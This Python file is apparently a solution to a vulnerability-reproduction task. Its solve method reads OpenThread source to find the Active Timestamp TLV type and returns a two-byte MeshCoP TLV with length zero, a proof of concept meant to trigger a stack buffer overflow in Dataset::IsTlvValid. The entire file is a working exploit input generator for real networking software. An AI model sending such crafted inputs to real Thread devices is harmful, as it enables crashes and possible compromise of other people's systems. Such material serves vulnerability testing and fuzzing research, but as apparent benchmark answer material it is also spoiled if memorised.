import os
import re
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in Dataset::IsTlvValid.
        The vulnerability allows Active/Pending Timestamp and Delay Timer TLVs to have invalid lengths 
        (less than required), leading to out-of-bounds access.
        """
        # Default constant for Active Timestamp TLV (MeshCoP) defined in OpenThread specs
        # kActiveTimestamp = 14 (0x0E)
        kActiveTimestamp = 14
        
        # Attempt to dynamically determine the constant from source code
        content = None
        try:
            if os.path.isdir(src_path):
                for root, dirs, files in os.walk(src_path):
                    if "meshcop_tlvs.hpp" in files:
                        with open(os.path.join(root, "meshcop_tlvs.hpp"), "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                        break
            elif os.path.isfile(src_path) and (src_path.endswith('.tar.gz') or src_path.endswith('.tar')):
                with tarfile.open(src_path, "r") as tar:
                    for member in tar.getmembers():
                        if member.name.endswith("meshcop_tlvs.hpp"):
                            f = tar.extractfile(member)
                            if f:
                                content = f.read().decode("utf-8", errors="ignore")
                            break
        except Exception:
            pass

        if content:
            # Search for kActiveTimestamp = ...
            match = re.search(r'kActiveTimestamp\s*=\s*(0x[0-9a-fA-F]+|[0-9]+)', content)
            if match:
                val_str = match.group(1)
                if val_str.startswith("0x"):
                    kActiveTimestamp = int(val_str, 16)
                else:
                    kActiveTimestamp = int(val_str)

        # Construct PoC
        # The vulnerability is triggered by providing an Active Timestamp TLV with a length
        # smaller than the required 8 bytes (sizeof(Timestamp)).
        # We provide a length of 0.
        # Format: Type (1 byte) | Length (1 byte)
        # Resulting bytes: 0x0E 0x00 (using default constant)
        
        return bytes([kActiveTimestamp, 0x00])
